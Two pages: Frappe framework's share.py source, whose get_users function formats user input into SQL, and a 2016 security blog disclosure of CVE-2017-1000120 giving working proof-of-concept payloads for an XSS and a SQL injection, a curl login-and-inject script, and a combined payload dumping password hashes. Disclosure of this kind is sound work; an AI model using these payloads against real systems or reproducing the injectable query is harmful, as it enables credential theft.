=== Content from github.com_4c4f94ec_20250126_060628.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffrappe%2Ffrappe%2Fblob%2F7dbe38e37a6c7e7474e60152c153a57a0c6638d6%2Ffrappe%2Fshare.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffrappe%2Ffrappe%2Fblob%2F7dbe38e37a6c7e7474e60152c153a57a0c6638d6%2Ffrappe%2Fshare.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=frappe%2Ffrappe)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[frappe](/frappe)
/
**[frappe](/frappe/frappe)**
Public

* [Notifications](/login?return_to=%2Ffrappe%2Ffrappe) You must be signed in to change notification settings
* [Fork
  3.6k](/login?return_to=%2Ffrappe%2Ffrappe)
* [Star
   7.8k](/login?return_to=%2Ffrappe%2Ffrappe)

* [Code](/frappe/frappe)
* [Issues
  2.2k](/frappe/frappe/issues)
* [Pull requests
  50](/frappe/frappe/pulls)
* [Actions](/frappe/frappe/actions)
* [Projects
  2](/frappe/frappe/projects)
* [Wiki](/frappe/frappe/wiki)
* [Security](/frappe/frappe/security)
* [Insights](/frappe/frappe/pulse)

Additional navigation options

* [Code](/frappe/frappe)
* [Issues](/frappe/frappe/issues)
* [Pull requests](/frappe/frappe/pulls)
* [Actions](/frappe/frappe/actions)
* [Projects](/frappe/frappe/projects)
* [Wiki](/frappe/frappe/wiki)
* [Security](/frappe/frappe/security)
* [Insights](/frappe/frappe/pulse)

## Files

 7dbe38e
## Breadcrumbs

1. [frappe](/frappe/frappe/tree/7dbe38e37a6c7e7474e60152c153a57a0c6638d6)
2. /[frappe](/frappe/frappe/tree/7dbe38e37a6c7e7474e60152c153a57a0c6638d6/frappe)
/
# share.py

Copy path Blame  Blame
## Latest commit

## History

[History](/frappe/frappe/commits/7dbe38e37a6c7e7474e60152c153a57a0c6638d6/frappe/share.py)134 lines (103 loc) · 3.88 KB 7dbe38e
## Breadcrumbs

1. [frappe](/frappe/frappe/tree/7dbe38e37a6c7e7474e60152c153a57a0c6638d6)
2. /[frappe](/frappe/frappe/tree/7dbe38e37a6c7e7474e60152c153a57a0c6638d6/frappe)
/
# share.py

Top
## File metadata and controls

* Code
* Blame

134 lines (103 loc) · 3.88 KB[Raw](https://github.com/frappe/frappe/raw/7dbe38e37a6c7e7474e60152c153a57a0c6638d6/frappe/share.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors# MIT License. See license.txt
from \_\_future\_\_ import unicode\_literalsimport frappefrom frappe import \_from frappe.utils import cint
@frappe.whitelist()def add(doctype, name, user=None, read=1, write=0, share=0, everyone=0, flags=None): """Share the given document with a user.""" if not user: user = frappe.session.user
 if not (flags or {}).get("ignore\_share\_permission"): check\_share\_permission(doctype, name)
 share\_name = get\_share\_name(doctype, name, user, everyone)
 if share\_name: doc = frappe.get\_doc("DocShare", share\_name) else: doc = frappe.new\_doc("DocShare") doc.update({ "user": user, "share\_doctype": doctype, "share\_name": name, "everyone": cint(everyone) })
 if flags: doc.flags.update(flags)
 doc.update({ # always add read, since you are adding! "read": 1, "write": cint(write), "share": cint(share) })
 doc.save(ignore\_permissions=True)
 return doc
def remove(doctype, name, user, flags=None): share\_name = frappe.db.get\_value("DocShare", {"user": user, "share\_name": name, "share\_doctype": doctype})
 if share\_name: frappe.delete\_doc("DocShare", share\_name, flags=flags)
@frappe.whitelist()def set\_permission(doctype, name, user, permission\_to, value=1, everyone=0): """Set share permission.""" check\_share\_permission(doctype, name)
 share\_name = get\_share\_name(doctype, name, user, everyone) value = int(value)
 if not share\_name: if value: share = add(doctype, name, user, everyone=everyone, \*\*{permission\_to: 1}) else: # no share found, nothing to remove share = {} pass else: share = frappe.get\_doc("DocShare", share\_name) share.flags.ignore\_permissions = True share.set(permission\_to, value)
 if not value: # un-set higher-order permissions too if permission\_to=="read": share.read = share.write = share.share = 0
 share.save()
 if not (share.read or share.write or share.share): share.delete() share = {}
 return share
@frappe.whitelist()def get\_users(doctype, name, fields="\*"): """Get list of users with which this document is shared""" if isinstance(fields, (tuple, list)): fields = "`{0}`".format("`, `".join(fields))
 return frappe.db.sql("select {0} from tabDocShare where share\_doctype=%s and share\_name=%s".format(fields), (doctype, name), as\_dict=True)
def get\_shared(doctype, user=None, rights=None): """Get list of shared document names for given user and DocType.
 :param doctype: DocType of which shared names are queried. :param user: User for which shared names are queried. :param rights: List of rights for which the document is shared. List of `read`, `write`, `share`"""
 if not user: user = frappe.session.user
 if not rights: rights = ["read"]
 condition = " and ".join(["`{0}`=1".format(right) for right in rights])
 return frappe.db.sql\_list("""select share\_name from tabDocShare where (user=%s {everyone}) and share\_doctype=%s and {condition}""".format( condition=condition, everyone="or everyone=1" if user!="Guest" else ""), (user, doctype))
def get\_shared\_doctypes(user=None): """Return list of doctypes in which documents are shared for the given user.""" if not user: user = frappe.session.user
 return frappe.db.sql\_list("select distinct share\_doctype from tabDocShare where (user=%s or everyone=1)", user)
def get\_share\_name(doctype, name, user, everyone): if cint(everyone): share\_name = frappe.db.get\_value("DocShare", {"everyone": 1, "share\_name": name, "share\_doctype": doctype}) else: share\_name = frappe.db.get\_value("DocShare", {"user": user, "share\_name": name, "share\_doctype": doctype})
 return share\_name
def check\_share\_permission(doctype, name): """Check if the user can share with other users""" if not frappe.has\_permission(doctype, ptype="share", doc=name): frappe.throw(\_("No permission to {0} {1} {2}".format("share", doctype, name)), frappe.PermissionError)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from tech.mantz-it.com_09bbcd39_20250125_045553.html ===


# [Mantz Tech](http://tech.mantz-it.com/)

## Mittwoch, 21. Dezember 2016

### SQL Injection in Frappe Framework

# CVE-2017-1000120

This is the story how we found a stored XSS and a post-login SQL-injection in the Frappe framework (version 7.1.26), which represent quite a threat for themselves and allow for a multi-stage attack on any frappe-website if combined.
## XSS

The XSS is found in [frappe.handler.py](https://github.com/frappe/frappe/blob/7dbe38e37a6c7e7474e60152c153a57a0c6638d6/frappe/handler.py), when using the /?cmd option on a page, there is a call to get\_attr(cmd) (line 30).
```

def execute_cmd(cmd, from_async=False):
    """execute a request as python module"""
    for hook in frappe.get_hooks("override_whitelisted_methods", {}).get(cmd, []):
 # override using the first hook
 cmd = hook
 break

    method = get_attr(cmd)    # line 30
    if from_async:
        method = method.queue

    is_whitelisted(method)

    ret = frappe.call(method, **frappe.form_dict)

    # returns with a message
    if ret:
        frappe.response['message'] = ret

...

def get_attr(cmd):
    """get method object from cmd"""
    if '.' in cmd:
     method = frappe.get_attr(cmd)
    else:
     method = globals()[cmd]    # line 116
    frappe.log("method:" + cmd)
    return method

```
If an invalid cmd is given, method = globals()[cmd] (line 116) throws an error. In the error any user input will be reflected.
### Proof of concept:

```

http://[yourhost]/?cmd=a%3Cscript%3Eeval(atob(%22YWxlcnQoZG9jdW1lbnQuY29va2llKQ==%22));%3C/script%3E

```
The command itself (alert(document.cookie)) is base64 encoded, since get\_attribute() separates at ‘.’ characters.

Since the error message including the malicious command is logged in the admin interface (Error-Snapshot), this represents a stored XSS (admin only) and a reflected XSS for any other given user.
## SQLi (CVE-2017-1000120)

The SQL-injection is found in [frappe.share.py](https://github.com/frappe/frappe/blob/7dbe38e37a6c7e7474e60152c153a57a0c6638d6/frappe/share.py) in the get\_users() (line 86) function. Since this function is whitelisted, it may be called with any valid user account (no special privileges).
```

def get_users(doctype, name, fields="*"):
    """Get list of users with which this document is shared"""
    if isinstance(fields, (tuple, list)):
        fields = "`{0}`".format("`, `".join(fields))

    return frappe.db.sql(
        "select {0} from tabDocShare where share_doctype=%s and share_name=%s"
        .format(fields), (doctype, name), as_dict=True)    #line 86

```
As the code snippet shows, unfiltered user input is directly inserted into the SQL statement (using Python’s format()). Calling the following command from the JSConsole with a logged in account yields the \_\_Auth database.
```

frappe.call({method: "frappe.share.get_users", args: {doctype: "", name: "", fields: "name, password, salt from __Auth union select 1,1,1"}, callback: function (r) {}})

```
## POC:

```

#!/bin/bash

URL="http://$1:$2/"
USERNAME=?
PASSWORD=?
PAYLOAD="doctype=&name=&fields=name%2C+password%2C+salt+from+__Auth+union+select+1%2C1%2C1&cmd=frappe.share.get_users"

echo "Target URL: $URL"

# Login
echo "Try login with test@test.de pw:test ..."
curl -v -d "cmd=login&usr=$USERNAME&pwd=$PASSWORD&device=desktop" "$URL" > /tmp/frappe_login.txt 2>&1
cat /tmp/frappe_login.txt | grep Cookie | awk '{print $3}' | tr "\n" " " > /tmp/frappe_cookies.txt
echo "Got Session Cookie: `cat /tmp/frappe_cookies.txt`"
curl --cookie "`cat /tmp/frappe_cookies.txt`" ${URL}desk 2>/dev/null | grep csrf_token | awk -F\" '{print $2}' > /tmp/frappe_csrf_token.txt
echo "Got CSRF Token: `cat /tmp/frappe_csrf_token.txt`"

# SQL Injection
echo "Trigger SQL Injection..."
curl --header "X-Frappe-CSRF-Token: `cat /tmp/frappe_csrf_token.txt`" --cookie "`cat /tmp/frappe_cookies.txt`" -d $PAYLOAD $URL

# Clean up
rm /tmp/frappe_login.txt
rm /tmp/frappe_cookies.txt
rm /tmp/frappe_csrf_token.txt

```
Both issues have been [fixed](https://github.com/frappe/frappe/commit/68e14d40c2d496173d8e687e2e80b4637db9d83b#diff-ce6d074582812c78df4b58a2057c8b06) in a very timely manner (nice work from the frappe team here). The fix is included in version 7.1.29 of the frappe framework.

## Multistage

To line out the pretty critical nature of the exploits, here is a combination of both, which allows database disclosure if any logged-in victim clicks on a malicious link or the administrator reads error-logs:
```

http://[yourhost]/?cmd=a%3Cscript%3Eeval(atob(%22ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGZ1bmN0aW9uKCkgew0KICAgeD1mcmFwcGUuY2FsbCh7bWV0aG9kOiAiZnJhcHBlLnNoYXJlLmdldF91c2VycyIsIGFyZ3M6IHtkb2N0eXBlOiAiIiwgbmFtZTogIiIsZmllbGRzOiAibmFtZSwgcGFzc3dvcmQsIHNhbHQgZnJvbSBfX0F1dGggdW5pb24gc2VsZWN0IDEsMSwxIn0sY2FsbGJhY2s6IGZ1bmN0aW9uKHIpIHt9fSk7DQogICBhbGVydCgiWFNTISBBbmQgZXZlbiBiZXR0ZXIsIGNsaWNrIG9rYXkgdG8gc2VlIHNvbWUgbWFnaWMhIik7DQogICBhbGVydChKU09OLnN0cmluZ2lmeSh4LnJlc3BvbnNlSlNPTikpOw0KfSwgZmFsc2UpOw==%22));%3C/script%3E

```
Here the non-encoded POC:
```

document.addEventListener('DOMContentLoaded', function() {
   x=frappe.call({method: "frappe.share.get_users", args: {doctype: "", name: "",fields: "name, password, salt from __Auth union select 1,1,1"},callback: function(r) {}});
   alert("XSS! And even better, click okay to see some magic!");
   alert(JSON.stringify(x.responseJSON));
}, false);

```
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDwhOyyogwGqej1-uynvFFdsWte_wqxueTTLtSpYYd6vCmOyoQTQYlmatoWwz425hdTpw43oaIdDOLViKFFZ62ajpjhKS-y3ae-TyBo3k17Hk3IKYi56INaKkiCPm-D2ZB54E98zLgmeH-/s640/xss_sqli.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDwhOyyogwGqej1-uynvFFdsWte_wqxueTTLtSpYYd6vCmOyoQTQYlmatoWwz425hdTpw43oaIdDOLViKFFZ62ajpjhKS-y3ae-TyBo3k17Hk3IKYi56INaKkiCPm-D2ZB54E98zLgmeH-/s1600/xss_sqli.png)

The EventListener is used since we need to access some JS which is loaded after our XSS, so we needed to delay the malicious code.

Fabian Ullrich (fullrich[at]fullsec.de), Dennis Mantz (dennis.mantz@googlemail.com)

Link to CVE: <http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-1000120>

Eingestellt von

[Dennis Mantz](https://www.blogger.com/profile/15281478138521513958 "author profile")

um

[14:25](http://tech.mantz-it.com/2016/12/sql-injection-in-frappe-framework.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=5663468257254794273&postID=5625612621530311760&from=pencil "Post bearbeiten")

[Diesen Post per E-Mail versenden](https://www.blogger.com/share-post.g?blogID=5663468257254794273&postID=5625612621530311760&target=email "Diesen Post per E-Mail versenden")[BlogThis!](https://www.blogger.com/share-post.g?blogID=5663468257254794273&postID=5625612621530311760&target=blog "BlogThis!")[Auf X teilen](https://www.blogger.com/share-post.g?blogID=5663468257254794273&postID=5625612621530311760&target=twitter "Auf X teilen")[In Facebook freigeben](https://www.blogger.com/share-post.g?blogID=5663468257254794273&postID=5625612621530311760&target=facebook "In Facebook freigeben")[Auf Pinterest teilen](https://www.blogger.com/share-post.g?blogID=5663468257254794273&postID=5625612621530311760&target=pinterest "Auf Pinterest teilen")

#### Keine Kommentare:

#### Kommentar veröffentlichen

[Älterer Post](http://tech.mantz-it.com/2016/10/join-beta-program-for-rf-analyzer.html "Älterer Post")

[Startseite](http://tech.mantz-it.com/)

Abonnieren
[Kommentare zum Post (Atom)](http://tech.mantz-it.com/feeds/5625612621530311760/comments/default)

## Über mich

[Dennis Mantz](https://www.blogger.com/profile/15281478138521513958)

[Mein Profil vollständig anzeigen](https://www.blogger.com/profile/15281478138521513958)

## Subscribe

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=http%3A%2F%2Ftech.mantz-it.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=http%3A%2F%2Ftech.mantz-it.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](http://tech.mantz-it.com/feeds/posts/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Kommentare

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=http%3A%2F%2Ftech.mantz-it.com%2Ffeeds%2F5625612621530311760%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=http%3A%2F%2Ftech.mantz-it.com%2Ffeeds%2F5625612621530311760%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](http://tech.mantz-it.com/feeds/5625612621530311760/comments/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Kommentare

## Blog-Archiv

* ▼
  [2016](http://tech.mantz-it.com/2016/)
  (2)
  + ▼
    [Dezember](http://tech.mantz-it.com/2016/12/)
    (1)
    - [SQL Injection in Frappe Framework](http://tech.mantz-it.com/2016/12/sql-injection-in-frappe-framework.html)
  + ►
    [Oktober](http://tech.mantz-it.com/2016/10/)
    (1)

* ►
  [2015](http://tech.mantz-it.com/2015/)
  (1)
  + ►
    [März](http://tech.mantz-it.com/2015/03/)
    (1)

* ►
  [2014](http://tech.mantz-it.com/2014/)
  (8)
  + ►
    [Oktober](http://tech.mantz-it.com/2014/10/)
    (3)
  + ►
    [September](http://tech.mantz-it.com/2014/09/)
    (2)
  + ►
    [Mai](http://tech.mantz-it.com/2014/05/)
    (1)
  + ►
    [April](http://tech.mantz-it.com/2014/04/)
    (1)
  + ►
    [März](http://tech.mantz-it.com/2014/03/)
    (1)

## Donate

![](https://www.paypalobjects.com/de_DE/i/scr/pixel.gif)

|  |  |
| --- | --- |

Design "Awesome AG". Powered by [Blogger](https://www.blogger.com).


